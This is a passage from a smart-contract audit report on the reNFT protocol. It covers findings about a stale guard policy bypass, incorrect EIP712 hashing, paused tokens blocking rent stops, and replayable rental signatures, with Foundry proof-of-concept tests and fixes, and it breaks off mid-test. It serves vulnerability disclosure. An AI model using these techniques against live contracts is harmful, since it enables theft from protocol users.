        owners[0] = alice.addr;
        bytes memory initializerPayload = abi.encodeCall(
            ISafe.setup,
            (
                owners,
                1,
                address(0),
                new bytes(0),
                address(0),
                address(0),
                0,
                payable(address(0))
            )
        );
        // new safe is created
        address newSafe = address(
            safeFactory.createProxyWithNonce(
                address(safeSingleton),
                initializerPayload,
                uint256(keccak256(""))
            )
        );
        address receiver = address(0x1010101);

        // Transfer some ETH to the freshly deployed safe
        vm.deal(newSafe, 1 ether);
        assertEq(newSafe.balance, 1 ether);
        assertEq(receiver.balance, 0);

        // Pull out the sent ETH from the safe
        bytes memory transactionSignature = _signTransaction(
            address(newSafe),
            Enum.Operation.Call,
            alice.privateKey,
            address(receiver),
            1 ether,
            new bytes(0)
        );
        _executeTransaction(
            address(newSafe),
            Enum.Operation.Call,
            address(receiver),
            1 ether,
            new bytes(0),
            transactionSignature,
            new bytes(0)
        );
        // ETH succesfully pulled out from the safe
        assertEq(newSafe.balance, 0);
        assertEq(receiver.balance, 1 ether);

        /// Now replicate same scenario for a ReNFT safe

        // Send some ETH to an existing ReNFT safe of Alice
        vm.deal(address(alice.safe), 1 ether);
        assertEq(address(alice.safe).balance, 1 ether);
        assertEq(receiver.balance, 1 ether);

        transactionSignature = _signTransaction(
            address(alice.safe),
            Enum.Operation.Call,
            alice.privateKey,
            address(receiver),
            1 ether,
            new bytes(0)
        );
        // Try to pull out ETH
        // Txn reverts with error `GuardPolicy_FunctionSelectorRequired`
        vm.expectRevert(abi.encodeWithSelector(Errors.GuardPolicy_FunctionSelectorRequired.selector));
        _executeTransaction(
            address(alice.safe),
            Enum.Operation.Call,
            address(receiver),
            1 ether,
            new bytes(0),
            transactionSignature,
            new bytes(0)
        );
        // ETH remains stuck in Alice's ReNFT safe
        assertEq(address(alice.safe).balance, 1 ether);
        assertEq(receiver.balance, 1 ether);
    }

    function _signTransaction(
        address safe,
        Enum.Operation operation,
        uint256 ownerPrivateKey,
        address to,
        uint256 value,
        bytes memory transaction
    ) private view returns (bytes memory transactionSignature) {
        // get the safe nonce
        uint256 nonce = ISafe(safe).nonce();

        // get the eip712 compatible transaction hash that the safe owner will sign
        bytes32 transactionHash = ISafe(safe).getTransactionHash(
            to,
            value,
            transaction,
            operation,
            0 ether,
            0 ether,
            0 ether,
            address(0),
            payable(address(0)),
            nonce
        );

        // sign the transaction
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, transactionHash);
        transactionSignature = abi.encodePacked(r, s, v);
    }
    function _executeTransaction(
        address safe,
        Enum.Operation operation,
        address to,
        uint256 value,
        bytes memory transaction,
        bytes memory signature,
        bytes memory expectedError
    ) private {
        // expect an error if error data was provided
        if (expectedError.length != 0) {
            vm.expectRevert(expectedError);
        }

        // execute the transaction
        ISafe(safe).execTransaction(
            to,
            value,
            transaction,
            operation,
            0 ether,
            0 ether,
            0 ether,
            address(0),
            payable(address(0)),
            signature
        );
    }
}

```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Consider allowing `data.length` to be `0` as that will be used for performing native ETH transfers.


**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/292#issuecomment-1913746798):**
 > See comment on [issue 261](https://github.com/code-423n4/2024-01-renft-findings/issues/261#issuecomment-1913746141).

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/292#issuecomment-1915464362):**
 > Agree that this is a valid M vulnerability.

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/6) - Allows native ETH to be transferred out of a rental safe.

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/54) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/56).
***

## [[M-10] The owners of a rental safe can continue to use the old guard policy contract for as long as they want, regardless of a new guard policy upgrade](https://github.com/code-423n4/2024-01-renft-findings/issues/267)
*Submitted by [oakcobalt](https://github.com/code-423n4/2024-01-renft-findings/issues/267), also found by [m4ttm](https://github.com/code-423n4/2024-01-renft-findings/issues/595) and [ladboy233](https://github.com/code-423n4/2024-01-renft-findings/issues/181)*

Policy contracts such as Guard.sol can be upgraded when needed. However, there is a vulnerability in existing implementation of Guard policy, that allows a rental safe contract to use the outdated Guard.sol for an unlimited amount of time.

This compromises the security of the rental wallet because unsafe transactions that are checked and reverted in the new guard policy contract can be directly bypassed and permitted in rental safe contract using an old guard policy.

### Proof of Concept

Policy contracts can be upgraded by protocol executor on Kernel.sol through `executeAction()` -> `_activatePolicy()` -> `_deactivePolicy()`. When Guard.sol needs to be upgraded, the intended flow is a) `_activatePolicy(newGuard)` b) `_deactivePolicy(oldGuard)`, c) admin will whitelist a temporary migration contract which allows any rental safe wallet to make a delegate call to migration contract to upgrade the guard address in storage. This flow can also be confirmed in test: test/integration/upgradeability/GuardPolicyUpgrade.t.sol.

Note in this intended flow, the rental safe contract owner needs to initiate a delegate call to the whitelisted migration contract to update the pointer to the new guard address.

However, the issue is (1) there is no enforcement that an existing rental safe contract owner will call the migration contract to upgrade their guard address; (2)  even if the safe owner doesn't call to update their guard address, the rental safe will be able to continue to use the old guard contract to execute transactions, bypassing any new restrictions that might be enforced in the new guard.

This is because current Guard.sol's key user flows that involve `_checkTransactions()`, `_forwardToHook()`,`_revertNonWhiteListedExtensions()` won't check if the existing Guard.sol address stored in the safe contract is still active, and these flows will only call Storage.sol's view functions or public variables that have no access control to revert when the caller Guard.sol is no longer active in Kernel.

As a result, even though the active Guard.sol in Kernel.sol is a different address and the old guard doesn't exist in Kernel's storage, all the rental safe flows can still use the old guard to check transactions.

<details>

```solidity
//src/policies/Guard.sol
    function checkTransaction(
        address to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256,
        uint256,
        uint256,
        address,
        address payable,
        bytes memory,
        address
    ) external override {
        // Disallow transactions that use delegate call, unless explicitly
        // permitted by the protocol.
|>      //@audit There are no checks to see if address(this) (guard) is still active in Kernel.sol
        //@audit note: when Guard.sol is no longer active, STORE.whitelistedDelegates(to) will still pass, because it's a view funciton with no access control
|>      if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {
            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
        }
        // Require that a function selector exists.
        if (data.length < 4) {
            revert Errors.GuardPolicy_FunctionSelectorRequired();
        }
        // Fetch the hook to interact with for this transaction.
        //@audit note: when Guard.sol is no longer active, STORE.contractToHook(to) and STORE.hookOnTransaction(hook) because they are view functions with no access control
|>      address hook = STORE.contractToHook(to);
|>      bool isActive = STORE.hookOnTransaction(hook);
        // If a hook exists and is enabled, forward the control flow to the hook.
        if (hook != address(0) && isActive) {
            _forwardToHook(hook, msg.sender, to, value, data);
        }
        // If no hook exists, use basic tx check.
        else {
            _checkTransaction(msg.sender, to, data);
        }
    }
```

</details>

(<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L324-L331>)

<details>

```solidity
//src/policies/Guard.sol
    function _checkTransaction(address from, address to, bytes memory data) private view {
...
            //@audit when Guard.sol is no longer active in Kernel, _revertSelectorOnActiveRental() will still work because it only calls view functions with no access control.
|>          _revertSelectorOnActiveRental(selector, from, to, tokenId);
...
            //@audit when Guard.sol is no longer active in Kernel, _revertNonWhitelistedExtension() will still work because it only calls view function with no access control
|>          _revertNonWhitelistedExtension(extension);
    }

    function _revertSelectorOnActiveRental(
        bytes4 selector,
        address safe,
        address token,
        uint256 tokenId
    ) private view {
        // Check if the selector is allowed.
        //@audit when Guard.sol is no longer active in Kernel, STORE.isRentedOut() will still work because it only calls view function with no access control
|>      if (STORE.isRentedOut(safe, token, tokenId)) {
            revert Errors.GuardPolicy_UnauthorizedSelector(selector);
        }
    }

    function _revertNonWhitelistedExtension(address extension) private view {
        // Check if the extension is whitelisted.
        //@audit when Guard.sol is no longer active in Kernel, STORE.whitelistedExtensions() will still work because it only calls view function with no access control
|>       if (!STORE.whitelistedExtensions(extension)) {
            revert Errors.GuardPolicy_UnauthorizedExtension(extension);
        }
    }
```
</details>

(<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L133>)
(<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L145>)

In addition, this creates a condition where the behaviors of different rental safe contracts can be uneven, depending on whether a specific rental safe is using a new guard or old guard, they might have different levels of restrictions in executions, which undermines the fairness in the rental process. For example, some new function selectors can be prohibited from execution in the new guard based on the protocol needs, but these selectors will continue to be allowed in rental safes that use the old guard.

For comparison, a rental safe using an old Stop policy (Stop.sol) will cause revert at `stopRent()` or `stopRentBatch()` flow due to failing permissioned function sig checks, which will force safe owners to migrate to the new Stop.sol. But an old Guard policy allows safe owners to continue using an outdated `checkTransaction()` logics, which I consider it high severity.

### Recommended Mitigation Steps

In `checkTransaction()` , call Kernal.sol to check whether `address(this)` ( Guard.sol that the safe is pointing to) is still active. This can be done by calling `uint256 index = kernel.getPolicyIndex(address(this))` and then check if the index corresponds to `address(this)` in `kernel.activePolicies`.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/267#issuecomment-1910526872)**

**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/267#issuecomment-1913247132):**
 > > This compromises the security of the rental wallet because unsafe transactions that are checked and reverted in the new guard policy contract can be directly bypassed and permitted in rental safe contract using an old guard policy.
> 
> The warden doesn't show how this directly leads to loss of funds.  I think this falls into:
> 
> >  but the function of the protocol or its availability could be impacted, 
> 
> Therefore should be M.

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/12) - Introduces `isActive` check on the guard policy. Ensures that safes cannot use a guard that has been deactivated.

**Status:** Mitigation error. Full details in report from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/61), and also included in the [Mitigation Review](#mitigation-review) section below.

***

## [[M-11] Protocol does not implement EIP712 correctly on multiple occasions](https://github.com/code-423n4/2024-01-renft-findings/issues/239)
*Submitted by [BI\_security](https://github.com/code-423n4/2024-01-renft-findings/issues/239), also found by [plasmablocks](https://github.com/code-423n4/2024-01-renft-findings/issues/646), CipherSleuths ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/645), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/495), [3](https://github.com/code-423n4/2024-01-renft-findings/issues/472), [4](https://github.com/code-423n4/2024-01-renft-findings/issues/311)), [J4X](https://github.com/code-423n4/2024-01-renft-findings/issues/644), [pkqs90](https://github.com/code-423n4/2024-01-renft-findings/issues/643), [NentoR](https://github.com/code-423n4/2024-01-renft-findings/issues/641), [haxatron](https://github.com/code-423n4/2024-01-renft-findings/issues/640), [rokinot](https://github.com/code-423n4/2024-01-renft-findings/issues/639), SBSecurity ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/629), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/107)), EV\_om ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/620), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/613)), [trachev](https://github.com/code-423n4/2024-01-renft-findings/issues/514), hash ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/461), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/459), [3](https://github.com/code-423n4/2024-01-renft-findings/issues/458)), [SpicyMeatball](https://github.com/code-423n4/2024-01-renft-findings/issues/460), [Ward](https://github.com/code-423n4/2024-01-renft-findings/issues/450), [juancito](https://github.com/code-423n4/2024-01-renft-findings/issues/390), [jasonxiale](https://github.com/code-423n4/2024-01-renft-findings/issues/378), hals ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/353), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/350)), [0xPsuedoPandit](https://github.com/code-423n4/2024-01-renft-findings/issues/341), [KingNFT](https://github.com/code-423n4/2024-01-renft-findings/issues/280), [KupiaSec](https://github.com/code-423n4/2024-01-renft-findings/issues/265), [Giorgio](https://github.com/code-423n4/2024-01-renft-findings/issues/218), [deepplus](https://github.com/code-423n4/2024-01-renft-findings/issues/211), [zaevlad](https://github.com/code-423n4/2024-01-renft-findings/issues/204), [Tendency](https://github.com/code-423n4/2024-01-renft-findings/issues/184), [ABAIKUNANBAEV](https://github.com/code-423n4/2024-01-renft-findings/issues/167), [Hajime](https://github.com/code-423n4/2024-01-renft-findings/issues/165), [Beepidibop](https://github.com/code-423n4/2024-01-renft-findings/issues/150), 0xpiken ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/98), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/59)), [ravikiranweb3](https://github.com/code-423n4/2024-01-renft-findings/issues/81), [zzebra83](https://github.com/code-423n4/2024-01-renft-findings/issues/76), [boringslav](https://github.com/code-423n4/2024-01-renft-findings/issues/75), [ZdravkoHr](https://github.com/code-423n4/2024-01-renft-findings/issues/61), and rvierdiiev ([1](https://github.com/code-423n4/2024-01-renft-findings/issues/22), [2](https://github.com/code-423n4/2024-01-renft-findings/issues/21), [3](https://github.com/code-423n4/2024-01-renft-findings/issues/20), [4](https://github.com/code-423n4/2024-01-renft-findings/issues/19))*

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L151-L151> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L373-L375> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L384-L386> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L232-L238> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L636>

Being not EIP712 compliant can lead to issues with integrators and possibly DOS.

### Problem 1

The implementation of the hook hash ([here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L151C56-L151C56)) is done incorrectly. `hook.extraData` is of type `bytes` which according to EIP712 it is referred to as a `dynamic type`. Dynamic types must be first hashed with `keccak256` to become one 32-byte word before being encoded and hashed together with the typeHash and the other values.

### Mitigation to Problem 1:

```diff
function _deriveHookHash(Hook memory hook) internal view returns (bytes32) {
  // Derive and return the hook as specified by EIP-712.
    return
        keccak256(
-           abi.encode(_HOOK_TYPEHASH, hook.target, hook.itemIndex, hook.extraData)
+           abi.encode(_HOOK_TYPEHASH, hook.target, hook.itemIndex, keccak256(hook.extraData))
        );
}
```

### Problem 2

Some TypeHashes are computed by using `abi.encode` instead of `abi.encodePacked` ([here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L373C1-L375)) which makes the typeHash value and the whole final hash different from the hash that correctly implementing EIP712 entities would get.

```solidity
// Construct the Item type string.
bytes memory itemTypeString = abi.encodePacked(
    "Item(uint8 itemType,uint8 settleTo,address token,uint256 amount,uint256 identifier)"
);

// Construct the Hook type string.
bytes memory hookTypeString = abi.encodePacked(
    "Hook(address target,uint256 itemIndex,bytes extraData)"
);

// Construct the RentalOrder type string.
bytes memory rentalOrderTypeString = abi.encodePacked(
    "RentalOrder(bytes32 seaportOrderHash,Item[] items,Hook[] hooks,uint8 orderType,address lender,address renter,address rentalWallet,uint256 startTimestamp,uint256 endTimestamp)"
);

...

rentalOrderTypeHash = keccak256(
    abi.encode(rentalOrderTypeString, hookTypeString, itemTypeString)
);
```

The problem with this is that abi.encode-ing strings results in bytes with arbitrary length. In such cases (like the one here) there is a high chance that the bytes will not represent an exact N words in length (X &ast; 32 bytes length) and the data is padded to conform uniformly to 32-byte words. This padding results in an incorrect hash of the typeHash and it will make the digest hash invalid when compared with properly implemented hashes from widely used libraries such as ethers.

### Proof of Concept

Place the following code in any of the tests and run `forge test -—mt test_EIP712_encoding`

```solidity
function test_EIP712_encoding() public {
		// Copied from the reNFT codebase
    bytes memory itemTypeString = abi.encodePacked(
        "Item(uint8 itemType,uint8 settleTo,address token,uint256 amount,uint256 identifier)"
    );
    bytes memory hookTypeString = abi.encodePacked(
        "Hook(address target,uint256 itemIndex,bytes extraData)"
    );
    bytes memory rentalOrderTypeString = abi.encodePacked(
        "RentalOrder(bytes32 seaportOrderHash,Item[] items,Hook[] hooks,uint8 orderType,address lender,address renter,address rentalWallet,uint256 startTimestamp,uint256 endTimestamp)"
    );
		// protocol implementation
    bytes32 rentalOrderTypeHash = keccak256(
        abi.encode(rentalOrderTypeString, hookTypeString, itemTypeString) // <-----
    );

    // correct implementation
    bytes32 rentalOrderTypeHashCorrect = keccak256(
        abi.encodePacked(rentalOrderTypeString, hookTypeString, itemTypeString) // <-----
    );

    // the correct typehash
    bytes32 correctTypeHash = keccak256(
        "RentalOrder(bytes32 seaportOrderHash,Item[] items,Hook[] hooks,uint8 orderType,address lender,address renter,address rentalWallet,uint256 startTimestamp,uint256 endTimestamp)Hook(address target,uint256 itemIndex,bytes extraData)Item(uint8 itemType,uint8 settleTo,address token,uint256 amount,uint256 identifier)"
    );

    assertNotEq(rentalOrderTypeHash, rentalOrderTypeHashCorrect);
    assertNotEq(rentalOrderTypeHash, correctTypeHash);
    assertEq(rentalOrderTypeHashCorrect, correctTypeHash);
}
```

This test shows that the `rentalOrderTypeHashCorrect` is the correct typeHash.

### Mitigation to Problem 2

```diff
rentalOrderTypeHash = keccak256(
-    abi.encode(rentalOrderTypeString, hookTypeString, itemTypeString)
+    abi.encodePacked(rentalOrderTypeString, hookTypeString, itemTypeString)
);
```

### Problem 3

`_deriveOrderMetadataHash`  constructs the hash incorrectly because \_ORDER_METADATA_TYPEHASH includes `uint8 orderType` and `bytes emittedExtraData` (it can be seen [here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L384-L386C15)) but these values are not provided below the typeHash (it can be seen [here](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Signer.sol#L232-L238)).

```solidity
function _deriveOrderMetadataHash(
    OrderMetadata memory metadata
) internal view returns (bytes32) {
    bytes32[] memory hookHashes = new bytes32[](metadata.hooks.length);

    for (uint256 i = 0; i < metadata.hooks.length; ++i) {
        hookHashes[i] = _deriveHookHash(metadata.hooks[i]);
    }

    return
        keccak256(
            abi.encode(
                _ORDER_METADATA_TYPEHASH,// OrderMetadata(uint8 orderType,uint256 rentDuration,Hook[] hooks,bytes emittedExtraData)
								// <---- misses uint8 orderType
                metadata.rentDuration,
                keccak256(abi.encodePacked(hookHashes))
								// <---- misses bytes emittedExtraData
            )
        );
}
```

This hash is important because it is compared to the zoneHash inside `Create.sol:validateOrder → _rentFromZone → _isValidOrderMetadata` ([link](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Create.sol#L636)): So if the provided zoneHash from Seaport was generated correctly and it is not the same as the one generated by reNFT, the protocol will not be able to create any rentalOrders resulting in **DOS**.

In any case, this implementation is not according to EIP712 and either the fields must be included or the `_ORDER_METADATA_TYPEHASH` must remove `uint8 orderType` and `bytes emittedExtraData`

### Tools Used

Foundry

### Recommendations

Apply the described fixes for each example.

**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/239#issuecomment-1908739770)**

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/2) - Properly implements EIP-712.

**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/17), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/62) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/58).

***

## [[M-12] paused ERC721/ERC1155 could cause stopRent to revert, potentially causing issues for the lender.](https://github.com/code-423n4/2024-01-renft-findings/issues/220)
*Submitted by [said](https://github.com/code-423n4/2024-01-renft-findings/issues/220), also found by [SBSecurity](https://github.com/code-423n4/2024-01-renft-findings/issues/649)*

Many ERC721/ERC1155 tokens, including well-known games such as Axie Infinity, have a pause functionality inside the contract. This pause functionality will cause the `stopRent` call to always revert and could cause issues, especially for the `PAY` order type.

### Proof of Concept

When `stopRent` /`stopRentBatch` is called, it will eventually trigger `  _reclaimRentedItems ` and execute `reclaimRentalOrder` from the safe to send back tokens to lender.

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L353> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L166-L183>



```solidity
    function _reclaimRentedItems(RentalOrder memory order) internal {
        // Transfer ERC721s from the renter back to lender.
        bool success = ISafe(order.rentalWallet).execTransactionFromModule(
            // Stop policy inherits the reclaimer package.
            address(this),
            // value.
            0,
            // The encoded call to the `reclaimRentalOrder` function.
            abi.encodeWithSelector(this.reclaimRentalOrder.selector, order),
            // Safe must delegate call to the stop policy so that it is the msg.sender.
            Enum.Operation.DelegateCall
        );

        // Assert that the transfer back to the lender was successful.
        if (!success) {
            revert Errors.StopPolicy_ReclaimFailed();
        }
    }
```

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L71-L101> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L32-L34> 

<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/packages/Reclaimer.sol#L42-L50>

```solidity
    function reclaimRentalOrder(RentalOrder calldata rentalOrder) external {
        // This contract address must be in the context of another address.
        if (address(this) == original) {
            revert Errors.ReclaimerPackage_OnlyDelegateCallAllowed();
        }

        // Only the rental wallet specified in the order can be the address that
        // initates the reclaim. In the context of a delegate call, address(this)
        // will be the safe.
        if (address(this) != rentalOrder.rentalWallet) {
            revert Errors.ReclaimerPackage_OnlyRentalSafeAllowed(
                rentalOrder.rentalWallet
            );
        }

        // Get a count for the number of items.
        uint256 itemCount = rentalOrder.items.length;

        // Transfer each item if it is a rented asset.
        for (uint256 i = 0; i < itemCount; ++i) {
            Item memory item = rentalOrder.items[i];

            // Check if the item is an ERC721.
            if (item.itemType == ItemType.ERC721)
>>>             _transferERC721(item, rentalOrder.lender);

            // check if the item is an ERC1155.
            if (item.itemType == ItemType.ERC1155)
>>>             _transferERC1155(item, rentalOrder.lender);
        }
    }
```

It can be observed that AxieInfinity has paused functionality : <https://etherscan.io/address/0xf5b0a3efb8e8e4c201e2a935f110eaaf3ffecb8d>

This is problematic, especially for the `PAY` order type. Consider a scenario where the lender is not satisfied with how the renter utilizes their `PAY` order's NFTs. Now, when the lender wants to early stop the rent and calls `stopRent`, the call will revert, and the earning calculation for the renter will still be growing.

### Recommended Mitigation Steps

Consider decoupling the NFT claim from stopRent and introducing a timestamp tracker when the lender calls stopRent. Utilize that timestamp value when the rent stop is finalized and calculate the ERC20 reward for the renter.

**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1908721888):**
 > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol

**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/220#issuecomment-1921360740):**
 > In theory the protocol could mitigate this with a pull mechanism which could be executed after the unpause and allow the counterparty to be unaffected.  Currently this amounts to a temporary DOS and therefore seems like M is correct.  I think its an edge case, but its plausible as the warden has shown. 

 _Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/220)._

**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**
> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>
> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.

**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/64) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/59).

***

## [[M-13] `RentPayload`'s signature can be replayed](https://github.com/code-423n4/2024-01-renft-findings/issues/162)
*Submitted by [0xpiken](https://github.com/code-423n4/2024-01-renft-findings/issues/162), also found by [hals](https://github.com/code-423n4/2024-01-renft-findings/issues/642), [trachev](https://github.com/code-423n4/2024-01-renft-findings/issues/488), [hash](https://github.com/code-423n4/2024-01-renft-findings/issues/457), [rbserver](https://github.com/code-423n4/2024-01-renft-findings/issues/442), [evmboi32](https://github.com/code-423n4/2024-01-renft-findings/issues/370), [bareli](https://github.com/code-423n4/2024-01-renft-findings/issues/305), [OMEN](https://github.com/code-423n4/2024-01-renft-findings/issues/294), [Kalyan-Singh](https://github.com/code-423n4/2024-01-renft-findings/issues/233), [Topmark](https://github.com/code-423n4/2024-01-renft-findings/issues/196), [kaden](https://github.com/code-423n4/2024-01-renft-findings/issues/179), and [peter](https://github.com/code-423n4/2024-01-renft-findings/issues/133)*

A malicious user could potentially fulfill all `PAY` orders that own the same value of `zonehash`.

### Proof of Concept

The rental process in `reNFT` can simply be described as follows:

1.  `lender` create either `BASE` or `PAY` order, which includes a `zoneHash`.
2.  `renter` fulfills the rental order by providing certain items, including `fulfiller`, `payload`(a structured data of `RentPayload`), and its corresponding signature.
3.  Once the rental order is created, `Create#validateOrder()` will be executed to verify if the rental order is valid:
    *   decode `payload` and its `signature` from `zoneParams.extraData`
    *   Check if the signature is expired by comparing `payload.expiration` and `block.timestamp`
    *   Recover the signer from `payload` and its `signature` and check if the signer is protocol signer
    *   check if `zonehash` is equal to the derived hash of `payload.metadata`

Let's take a look at `RentPayload` and its referenced structures:

```solidity
struct RentPayload {
    OrderFulfillment fulfillment;
    OrderMetadata metadata;
    uint256 expiration;
    address intendedFulfiller;
}
struct OrderFulfillment {
    // Rental wallet address.
    address recipient;
}
struct OrderMetadata {
    // Type of order being created.
    OrderType orderType;
    // Duration of the rental in seconds.
    uint256 rentDuration;
    // Hooks that will act as middleware for the items in the order.
    Hook[] hooks;
    // Any extra data to be emitted upon order fulfillment.
    bytes emittedExtraData;
}
```

By observing all items in `Rentpayload`, it's obvious that there is no way to verify whether the signature of a `payload` has been used or not. The signature verification can always be passed as long as it has not expired.

If multiple `PAY` rental orders own the same `metadata`, a user could potentially utilize their `payload` and unexpired `signature` to fulfill all these rental orders and acquire rental earnings. Since `OrderMetadata` structure is very simple, the chance that two different orders own same `metadata` could be high.

Update testcase `test_stopRentBatch_payOrders_allDifferentLenders()`in [`StopRentBatch.t.sol`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/test/integration/StopRentBatch.t.sol) with below codes and run `forge test --match-test test_stopRentBatch_payOrders_allDifferentLenders`:

<details>

```diff
    function test_stopRentBatch_payOrders_allDifferentLenders() public {
        // create an array of offerers
        ProtocolAccount[] memory offerers = new ProtocolAccount[](3);
        offerers[0] = alice;
        offerers[1] = bob;
        offerers[2] = carol;

        // for each offerer, create an order and a fulfillment
        for (uint256 i = 0; i < offerers.length; i++) {
            // create a PAY order
            createOrder({
                offerer: offerers[i],
                orderType: OrderType.PAY,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 1,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 0
            });

            // finalize the pay order creation
            (
                Order memory payOrder,
                bytes32 payOrderHash,
                OrderMetadata memory payOrderMetadata
            ) = finalizeOrder();

            // create a PAYEE order. The fulfiller will be the offerer.
            createOrder({
                offerer: dan,
                orderType: OrderType.PAYEE,
                erc721Offers: 0,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 1,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the pay order creation
            (
                Order memory payeeOrder,
                bytes32 payeeOrderHash,
                OrderMetadata memory payeeOrderMetadata
            ) = finalizeOrder();

            // create an order fulfillment for the pay order
            createOrderFulfillment({
                _fulfiller: dan,
                order: payOrder,
                orderHash: payOrderHash,
                metadata: payOrderMetadata
            });

            // create an order fulfillment for the payee order
            createOrderFulfillment({
                _fulfiller: dan,
                order: payeeOrder,
                orderHash: payeeOrderHash,
                metadata: payeeOrderMetadata
            });
+           console.logBytes(ordersToFulfill[i*2].advancedOrder.extraData);

            // add an amendment to include the seaport fulfillment structs
            withLinkedPayAndPayeeOrders({
                payOrderIndex: (i * 2),
                payeeOrderIndex: (i * 2) + 1
            });
        }

        // finalize the order pay/payee order fulfillments
        RentalOrder[] memory rentalOrders = finalizePayOrdersFulfillment();

        // pull out just the PAY orders
        RentalOrder[] memory payRentalOrders = new RentalOrder[](3);
        for (uint256 i = 0; i < rentalOrders.length; i++) {
